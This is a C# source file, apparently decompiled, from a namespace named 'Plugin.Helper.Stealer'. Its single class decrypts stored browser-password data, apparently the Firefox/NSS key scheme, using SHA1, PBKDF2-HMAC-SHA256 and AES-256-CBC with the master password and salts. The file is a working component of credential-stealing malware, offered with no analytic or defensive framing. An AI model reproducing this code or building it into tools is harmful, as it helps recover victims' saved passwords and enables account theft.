

using System;
using System.Security.Cryptography;


namespace Plugin.Helper.Stealer
{
	public static class PasswordBasedDecryption
	{
		private static SHA1Managed sha1 = new SHA1Managed();
		private static byte[] ivPrefix = new byte[2]
		{
			(byte) 4,
			(byte) 14
		};

		public static byte[] Decrypt(
			byte[] ciphertext,
			byte[] globalSalt,
			byte[] masterPassword,
			byte[] entrySalt,
			byte[] partIV,
			int iterations = 1,
			int keyLength = 32)
		{
			if (masterPassword == null)
				masterPassword = new byte[0];
			byte[] numArray1 = new byte[globalSalt.Length + masterPassword.Length];
			Array.Copy((Array) globalSalt, 0, (Array) numArray1, 0, globalSalt.Length);
			Array.Copy((Array) masterPassword, 0, (Array) numArray1, globalSalt.Length, masterPassword.Length);
			byte[] hash1 = PasswordBasedDecryption.sha1.ComputeHash(numArray1);
			byte[] numArray2 = new byte[PasswordBasedDecryption.ivPrefix.Length + partIV.Length];
			Array.Copy((Array) PasswordBasedDecryption.ivPrefix, 0, (Array) numArray2, 0, PasswordBasedDecryption.ivPrefix.Length);
			Array.Copy((Array) partIV, 0, (Array) numArray2, PasswordBasedDecryption.ivPrefix.Length, partIV.Length);
			HMACSHA256 algo = new HMACSHA256();
			byte[] hash2 = new PBKDF2((HMAC) algo, hash1, entrySalt, iterations).ComputeHash(keyLength);
			AesManaged aesManaged = new AesManaged();
			aesManaged.Mode = CipherMode.CBC;
			aesManaged.BlockSize = 128;
			aesManaged.KeySize = 256;
			aesManaged.Padding = PaddingMode.Zeros;
			ICryptoTransform decryptor = aesManaged.CreateDecryptor(hash2, numArray2);
			byte[] numArray3 = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
			decryptor.Dispose();
			aesManaged.Dispose();
			algo.Dispose();
			return numArray3;
		}
	}
}
